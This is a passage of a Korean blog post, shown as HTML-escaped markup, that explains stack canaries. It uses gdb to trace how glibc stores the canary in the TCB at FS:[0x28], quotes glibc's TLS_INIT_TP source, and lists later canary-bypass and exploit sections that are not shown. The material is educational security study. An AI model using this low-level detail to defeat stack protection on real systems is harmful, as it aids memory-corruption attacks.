          &lt;li&gt;&lt;a href=&quot;#122-gdb로-tcb의-스택-카나리-직접-확인하기&quot; id=&quot;markdown-toc-122-gdb로-tcb의-스택-카나리-직접-확인하기&quot;&gt;1.2.2. gdb로 TCB의 스택 카나리 직접 확인하기&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-카나리-생성-과정-분석&quot; id=&quot;markdown-toc-2-카나리-생성-과정-분석&quot;&gt;2. 카나리 생성 과정 분석&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#21-fs와-tls의-연결과정-추적&quot; id=&quot;markdown-toc-21-fs와-tls의-연결과정-추적&quot;&gt;2.1. fs와 TLS의 연결과정 추적&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#22-스택-카나리의-저장-과정-추적&quot; id=&quot;markdown-toc-22-스택-카나리의-저장-과정-추적&quot;&gt;2.2. 스택 카나리의 저장 과정 추적&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#23-main에서-사용되는-스택-카나리-확인&quot; id=&quot;markdown-toc-23-main에서-사용되는-스택-카나리-확인&quot;&gt;2.3. main에서 사용되는 스택 카나리 확인&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#3-카나리-우회&quot; id=&quot;markdown-toc-3-카나리-우회&quot;&gt;3. 카나리 우회&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#31-brute-force&quot; id=&quot;markdown-toc-31-brute-force&quot;&gt;3.1. Brute Force&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#32-tls-접근-canary-leak&quot; id=&quot;markdown-toc-32-tls-접근-canary-leak&quot;&gt;3.2. TLS 접근-Canary Leak&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#4-카나리-우회-실습&quot; id=&quot;markdown-toc-4-카나리-우회-실습&quot;&gt;4. 카나리 우회 실습&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#41-코드-분석&quot; id=&quot;markdown-toc-41-코드-분석&quot;&gt;4.1. 코드 분석&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#42-익스플로잇-구성&quot; id=&quot;markdown-toc-42-익스플로잇-구성&quot;&gt;4.2. 익스플로잇 구성&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#43-익스플로잇-실행&quot; id=&quot;markdown-toc-43-익스플로잇-실행&quot;&gt;4.3. 익스플로잇 실행&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#번외-삽질이-남긴-지식&quot; id=&quot;markdown-toc-번외-삽질이-남긴-지식&quot;&gt;번외: 삽질이 남긴 지식&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#1-와-리눅스-대상-분석을-하는데-윈도우-프로세스-관리를-가져왔다&quot; id=&quot;markdown-toc-1-와-리눅스-대상-분석을-하는데-윈도우-프로세스-관리를-가져왔다&quot;&gt;1. 와! 리눅스 대상 분석을 하는데 윈도우 프로세스 관리를 가져왔다?!?&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#&quot; id=&quot;markdown-toc-&quot;&gt;&lt;br /&gt;&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;0-스택-카나리란&quot;&gt;0. 스택 카나리란?&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;스택 버퍼 오버플로우를 방어하기 위한 기법으로, 스택 버퍼와 반환 주소 사이에 임의로 생성된 값을 삽입하여 함수의 에필로그에서 해당 값의 변조를 확인하는 보호 기법
카나리 값의 변조가 확인되면 프로세스는 강제로 종료된다.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;1-카나리의-작동-원리&quot;&gt;1. 카나리의 작동 원리&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;11-카나리-비활성화-활성화-비교&quot;&gt;1.1. 카나리 비활성화-활성화 비교&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;스택 카나리를 비활성화하는 옵션은 아래와 같다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-fno-stack-protector&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;111-카나리-비활성화의-경우&quot;&gt;1.1.1. 카나리 비활성화의 경우&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;해당 옵션을 줘서 스택 카나리가 꺼진 프로그램을 실행해 스택 버퍼 오버플로우를 일으켜 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;SEGFAULT가 뜨면서 프로그램 작동이 멈춘다. 당연하다. 버퍼에게 할당된 범위를 넘어서는 길이의 입력값을 줬는데, 그 입력값이 RET addr를 오염시킬 정도의 길이였기 때문이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;112-카나리-활성화의-경우&quot;&gt;1.1.2. 카나리 활성화의 경우&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그렇다면 해당 옵션을 주지 않고 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gcc -o&lt;/code&gt; 옵션만으로 빌드해 스택 버퍼 오버플로우를 시도해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%201.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;직전의 카나리가 비활성화된 경우와 비교했을 때, ‘stack smashing detected; terminated’, ‘Aborted’ 메시지가 뜨며 프로세스가 강제 종료된 것을 확인할 수 있다. 스택 카나리가 변조된 것이 탐지되어 시스템에서 강제로 프로세스를 종료한 것이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;12--어셈블리-비교-분석-프롤로그와-에필로그의-차이&quot;&gt;1.2.  어셈블리 비교-분석; 프롤로그와 에필로그의 차이&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그렇다면 카나리를 켜고/끔에 따른 컴파일 결과는 어떻게 다를까. pwndbg를 통해 함수의 프롤로그와 에필로그를 비교해 보았다.&lt;/p&gt;

&lt;p&gt;카나리를 켠 버전의 디스어셈블 결과:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%202.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;카나리를 끈 버전의 디스어셈블 결과:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%203.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;둘을 비교한 결과, &lt;strong&gt;함수의 프롤로그와 에필로그에서 카나리를 켠 버전에 추가된 부분&lt;/strong&gt;이 눈에 띄었다.&lt;/p&gt;

&lt;p&gt;먼저 &lt;strong&gt;프롤로그&lt;/strong&gt;에 추가된 부분을 확인해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%204.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;FS레지스터로부터 8byte 주소를 가져온다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;121-fs가-대체-뭐야&quot;&gt;1.2.1. FS가 대체 뭐야?&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;사실 나는 더 깊은 공부를 위해 이 커리큘럼을 따라가고 있는지라, 이 절의 내용은 스택 카나리를 저장하는 구조체의 역사와 그것이 참조되는 상황의 관행에 대해 다루고 있다. 또한 스택 카나리를 가져올 때의 참조는 관행적 상황이 아니라는 말 또한 덧붙이고 있다.&lt;/p&gt;

&lt;p&gt;따라서 스택 카나리에 대해서 Overview를 하고픈 사람들에게는 이 절을 읽는 것을 추천하지 않는다.&lt;/p&gt;

&lt;p&gt;64bit 프로세스에서는 FS:[0x28], 32bit 프로세스에서는 GS:[0x14]가 스택 카나리를 저장하고 있다.&lt;/p&gt;

&lt;p&gt;그런데 왜? 왜 그렇게 정해졌을까? 의문이 든다. 그 이유를 서술하기 위해 TCB와 PCB에 대해 약간의 설명을 한 후, TCB의 어디에 무엇이 스택 카나리를 저장하는지에 대해 설명하는 것이 좋을 듯 하다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;먼저 &lt;strong&gt;PCB가 나온 배경&lt;/strong&gt;을 알아보고, &lt;strong&gt;PCB 안에 무엇이 왜 저장되는지&lt;/strong&gt;에 대해 알아보자.&lt;/p&gt;

&lt;p&gt;어떤 프로세스가 실행될 경우, OS는 Time Sharing과 Space Sharing을 모두 적용한 상위 개념인 &lt;strong&gt;프로세스 스케줄링(Process Scheduling)&lt;/strong&gt;을 수행하게 된다. 이는 Multiprogramming을 제공하는 OS가 가진 하드웨어 리소스의 제한 때문에 개발이 시작된 방법이면서, 이후 OS 내부에서 동일 자원에 접근하는 프로세스들이 동시에 실행될 경우 발생할 수 있는 Race Condition(Critical Section의 침해), 혹은 Deadlock(Critical Section을 여러 프로세스가 동시에 요구할 때 발생하는 교착상태)을 막기 위해 더욱 발전한 방법이다.&lt;/p&gt;

&lt;p&gt;이때, Time Sharing의 특성으로 인해 특정 &lt;strong&gt;프로그램 A를 일정 시간(Burst Time) 동안 수행하다가 중단하고, CPU를 다른 프로그램 B에게 할당해야 하는 상황&lt;/strong&gt;이 생긴다. 이럴 경우:&lt;/p&gt;

&lt;p&gt;프로그램 A가 실행되던 상태를 저장하고 → 프로그램 B를 실행한 다음 → 다시 프로그램 A가 자원을 점유(Occupy)할 때 → 이전에 저장된 상태를 불러오는&lt;/p&gt;

&lt;p&gt;일련의 기능이 보장되어야 한다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이와 같이 프로세스와 쓰레드의 실행 컨텍스트를 저장하기 위해 윈도우는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EPROCESS(PCB)-KPROCESS(PEB)&lt;/code&gt;와 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ETHREAD(TCB)-KTHREAD(TEB)&lt;/code&gt;라는 구조체를 사용하지만, 리눅스는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;task_struct(PCB)&lt;/code&gt; 와 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;thread_info(TCB)&lt;/code&gt; 라는 구조체를 사용한다. 상호간에 기능 자체는 유사하지만, 윈도우의 리눅스 시스템의 구조가 너무나도 다르기 때문에 상호 대체재로 보지는 않는다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;PCB: Process Control Block&lt;/li&gt;
  &lt;li&gt;PEB: Process Environment Block&lt;/li&gt;
  &lt;li&gt;TCB: Thread Control Block&lt;/li&gt;
  &lt;li&gt;TEB: Thread Environment Block&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이제 &lt;strong&gt;프로세스에서 TCB가 refer 되는 상황&lt;/strong&gt;에 대해 알아보자. 프로세스는 실행 효율성을 올리기 위해 자원을 공유한 채로 작업을 다중화하는데, 이렇게 다중화된 작업 하나하나를 쓰레드라고 한다. 그리고 이런 쓰레드의 실행 컨텍스트를 저장하는 것을 TCB라 부른다. 보통은 프로세스에서 TCB에 접근하면 PCB의 주소를 알아내려고 하는 경우가 많다(윈도우의 경우 TEB에 접근해 PEB 구조체의 시작 주소를 알아낸다).&lt;/p&gt;

&lt;p&gt;그리고 &lt;strong&gt;리눅스의 TCB, 윈도우의 TEB를 가리키는 것으로 애초에 예약된 레지스터가 바로 FS 레지스터&lt;/strong&gt;이다.(정확히는 TLS, Thread Local Storage를 참조해 TCB/TEB에 있는 정보 중 필요한 것을 알아낸다) 다만, 리눅스는 32bit 프로그램에서는 GS, 64bit에서는 FS 레지스터가 TEB를 가리킨다.&lt;/p&gt;

&lt;p&gt;그럼 지금쯤 궁금증이 생길 것이다. 그래서, 저기 위의 스택 카나리를 가져오는 부분에서 FS[0x28]을 썼으니 TCB를 참조한 것일 텐데… 그럼 PCB에 접근하려고 한 건가?&lt;/p&gt;

&lt;p&gt;아니다.&lt;/p&gt;

&lt;p&gt;이제까지 열심히 설명해 놓고 이렇게 말하려니 멋쩍다. 하지만 이제껏 설명한 건 FS 레지스터가 무조건 가리키는 대상인 TCB에 대해 설명하다 보니, TCB를 참조하는 행위가 PCB의 시작 주소를 알아내려는 목적으로 관행적으로 사용된다는 요지의 배경 설명이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;강조해 말하자면, 스택 카나리를 찾아오려 FS를 이용해 TCB에 접근하는 행위는 PCB의 시작 주소를 알기 위해 TCB에 접근하는 행위가 아니다.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;깃허브의 glibc 레포지토리를 확인해 보면, &lt;a href=&quot;https://github.com/lattera/glibc/blob/a2f34833b1042d5d8eeb263b4cf4caaea138c4ad/nptl/sysdeps/i386/tls.h#L44&quot;&gt;TCB의 헤더 구조체&lt;/a&gt;를 확인할 수 있다. 그곳에 있는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stack_guard&lt;/code&gt; 에 넣을 값을 생성하는 함수는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dl_setup_stack_chk_guard&lt;/code&gt; 로, &lt;a href=&quot;https://github.com/lattera/glibc/blob/a2f34833b1042d5d8eeb263b4cf4caaea138c4ad/sysdeps/generic/dl-osinfo.h#L23&quot;&gt;내부 매커니즘을 들여다보면&lt;/a&gt; 무조건 최하위 1byte가 NULL인 8byte 랜덤값이 생성됨을 알 수 있다. 즉, glibc를 이용해 컴파일된 모든 프로그램의 스택 카나리는 최하위 1byte가 NULL일 것이다.&lt;/p&gt;

&lt;p&gt;이렇게 생성된 스택 카나리 값은 TCB 구조체의 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stack_guard&lt;/code&gt; 항목에 저장된다.  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stack_guard&lt;/code&gt; 변수의 위치가 32bit에서는 TCB의 베이스 기준 0x14의 오프셋을 가지고 있고, 64bit에서는 0x28의 오프셋을 가지고 있기 때문에 리눅스 시스템에서 돌아가는 &lt;strong&gt;ELF 확장자 파일의 64bit 버전에서는 FS:[0x28], 32bit 버전에서는 GS:[0x14]가 스택 카나리를 저장&lt;/strong&gt;하게 되는 것이다.&lt;/p&gt;

&lt;p&gt;(리눅스에서 fs+0x28만 스택 카나리를 저장하는 게 아니다. 컴파일된 비트 버전에 따라 TLS-내부에 TCB가 있다-를 전담하는 레지스터가 달라진다. gdb를 붙여 64비트 버전과 32비트 버전을 비교하면 쉽게 확인할 수 있다)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;122-gdb로-tcb의-스택-카나리-직접-확인하기&quot;&gt;1.2.2. gdb로 TCB의 스택 카나리 직접 확인하기&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;gdb에서는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;info reg system&lt;/code&gt; 명령어를 통해 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fs_base&lt;/code&gt;와 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gs_base&lt;/code&gt; 등의 시스템 레지스터 내역을 출력할 수 있다. 단순히 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;info reg&lt;/code&gt; 를 통해 얻을 수 있는 레지스터들의 목록에는 표시되지 않는 레지스터들이 출력되니 중요한 명령어다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%205.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;현재 분석 대상 프로그램은 64비트로 컴파일되었으므로, fs 레지스터가 TCB 구조체를 refer할 것이다. 추측컨대, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fs_base&lt;/code&gt;는 TCB 구조체의 시작 주소를 항상 가지고 있는 게 아닐까 싶다… &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fs:[{hex}]&lt;/code&gt;일 땐 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fs_base+hex&lt;/code&gt; 를 참조하는 것 같고.&lt;/p&gt;

&lt;p&gt;아무튼, TCB 구조체 시작 주소의 심볼이 fs_base인 것을 알았으니 이제 스택 카나리가 저장된 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FS:[0x28]&lt;/code&gt;에 접근해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%206.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;LSB가 NULL인 값이 나온다. 확실히 스택 카나리의 포맷에 맞는다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%207.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;그리고 실제로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FS:[0x28]&lt;/code&gt;에 접근해 rax에 스택 카나리를 복사해 넣는 인스트럭션이 진행된 후의 rax 값과 동일하다. 즉, 스택 카나리 값에 성공적으로 접근했다!&lt;/p&gt;

&lt;p&gt;이제까지 프롤로그에 추가된 부분을 확인해 보았다. 다음으로 &lt;strong&gt;에필로그에 추가&lt;/strong&gt;된 부분을 분석해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%208.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read&lt;/code&gt; 함수를 부른 이후 eax를 정리하는 과정 바로 다음에 추가된 4줄의 인스트럭션이다.&lt;/p&gt;

&lt;p&gt;함수의 에필로그에서 저장되었던 스택 카나리를 불러와 TCB에 저장된 원본 스택 카나리와 xor 한다. 즉, 같은지 확인한다. 그 결과 같다면, 즉 xor 결과가 0이기 때문에 ZF가 1으로 세팅된다면 함수를 정상적으로 종료하도록 한다&lt;sup id=&quot;fnref:je&quot;&gt;&lt;a href=&quot;#fn:je&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot; role=&quot;doc-noteref&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;. 그러나 만일 다르다면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_stack_chk_fail&lt;/code&gt; 함수를 콜하게 된다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%201.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;앞서 보았던 이 메시지를 출력하는 함수가 바로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_stack_chk_fail&lt;/code&gt; 함수이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;2-카나리-생성-과정-분석&quot;&gt;2. 카나리 생성 과정 분석&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;앞서 말한 분석 내용을 정리하자면 다음과 같다.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;카나리 값은 프로세스가 시작될 때 TLS(Thread Local Space) 내부에 존재하는 TCB(Thread Control Block)&lt;sup id=&quot;fnref:TCBTLS&quot;&gt;&lt;a href=&quot;#fn:TCBTLS&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot; role=&quot;doc-noteref&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;에 전역 변수로 저장되고, 컴파일러는 각 함수마다 프롤로그와 에필로그에서 이 값을 참조하도록 한다.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;그렇다면, 정확히 카나리 값이 TCB에 저장되는 과정은 무엇일까? 이번 섹션에서는 그 과정을 하나씩 따라가 볼 것이다.&lt;/p&gt;

&lt;p&gt;카나리가 생성되어 저장되기까지의 과정을 큼직하게 나누어 보면 아래와 같다.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;프로세스 시작 → TLS 할당 → fs의 base값 지정 → 이후 fs를 이용한 TCB 접근 → 스택 카나리 저장&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;따라서, 먼저 fs의 base값이 어떻게 TLS와 연결되는지부터 확인해 보자.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;21-fs와-tls의-연결과정-추적&quot;&gt;2.1. fs와 TLS의 연결과정 추적&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;사실 TLS가 할당되고, FS 레지스터의 값을 TLS 구조체와 연결되도록 변경하는 과정에 대해서는 이 &lt;a href=&quot;https://chao-tic.github.io/blog/2018/12/25/tls&quot;&gt;포스트&lt;/a&gt;가 정말 잘 서술해 놨다. 해당 포스트에서 이 섹션에 필요한 내용만 조금 발췌해 서술하면 아래와 같다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;x86-64 커널에서는 FS에 저장되는 주소가 MSR(Model Specific Register; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MSR_FS_BASE&lt;/code&gt;)에 의해 관리된다&lt;sup id=&quot;fnref:MSR&quot;&gt;&lt;a href=&quot;#fn:MSR&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot; role=&quot;doc-noteref&quot;&gt;3&lt;/a&gt;&lt;/sup&gt;. 그리고 이러한 작용을 유저 프로세스가 커널에 요청할 수 있도록 시스템이 제공하는 system call이 바로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;arch_prctl&lt;/code&gt; 이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;즉, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;arch_prctl&lt;/code&gt; 시스콜이 call 되는 시점에 프로세스를 중지하고 컨텍스트를 들여다 보면 FS 값이 어떻게 변화하는지, 지정된 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fs_base&lt;/code&gt;는 무엇인지 알 수 있을 것이다.&lt;/p&gt;

&lt;p&gt;gdb에는 특정 행위가 발생했을 때 곧바로 프로세스 흐름을 중단하는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;catch&lt;/code&gt; 라는 명령어가 있다. 해당 명령어를 이용해 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;arch_prctl&lt;/code&gt; 시스콜이 발생하는 지점을 찾아보자. (이런 식으로 설정된 정지 지점은 breakpoint로 취급되기 때문에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;info b&lt;/code&gt; 명령어로 리스트를 뽑아 볼 수 있다)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%209.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;이제 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r&lt;/code&gt; 명령어로 프로그램을 실행해 보자. 플로우가 멈췄을 때의 콜스택은 아래와 같다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%2010.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;arch_prctl&lt;/code&gt; 이 요청되고 나서 해당 요청을 수행하기 위한 과정의 초입이다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;n&lt;/code&gt; 명령어로 쭉 따라가 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%2011.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;init_tls&lt;/code&gt; 함수가 콜된 상황이다. 이 시점에서 해당 함수의 내부에 정의된 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__tls_init_tp&lt;/code&gt; 매크로가 실행된다.&lt;/p&gt;

&lt;p&gt;그렇다면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__tls_init_tp&lt;/code&gt; 매크로는 어떤 기능을 할까?&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;glibc.git / sysdeps / x86_64 / nptl / tls.h&lt;/code&gt;&lt;/strong&gt; 소스 코드에 정의된 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TLS_INIT_TP&lt;/code&gt; 를 보자.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;# define TLS_INIT_TP(thrdescr) \
  ({ void *_thrdescr = (thrdescr);                                              \
     tcbhead_t *_head = _thrdescr;                                              \
     int _result;                                                              \
                                                                              \
     _head-&amp;gt;tcb = _thrdescr;                                                      \
     &lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* For now the thread descriptor is at the same address.  */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;              \
     _head-&amp;gt;self = _thrdescr;                                                      \
                                                                              \
     &lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* It is a simple syscall to set the %fs value for the thread.  */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;              \
     asm volatile (&quot;syscall&quot;                                                      \
                   : &quot;=a&quot; (_result)                                              \
                   : &quot;0&quot; ((unsigned long int) __NR_arch_prctl),                      \
                     &quot;D&quot; ((unsigned long int) ARCH_SET_FS),                      \
                     &quot;S&quot; (_thrdescr)                                              \
                   : &quot;memory&quot;, &quot;cc&quot;, &quot;r11&quot;, &quot;cx&quot;);                              \
                                                                              \
    _result ? &quot;cannot set %fs base address for thread-local storage&quot; : 0;     \
  })
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;중간에서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;asm volatile&lt;/code&gt; 로 인라인 어셈이 명시된 것이 보인다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;asm volatile&lt;/code&gt;은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__asm__ __volatile__(asms:output:input:clobber);&lt;/code&gt; 형식으로 사용되며, x86과 x86-64 환경에서는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;“D”&lt;/code&gt; 심볼이 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;‘di’&lt;/code&gt; 레지스터를 의미한다. 자세한 내용은 &lt;a href=&quot;https://wiki.kldp.org/KoreanDoc/html/EmbeddedKernel-KLDP/app3.basic.html&quot;&gt;여기에서&lt;/a&gt;&lt;/p&gt;

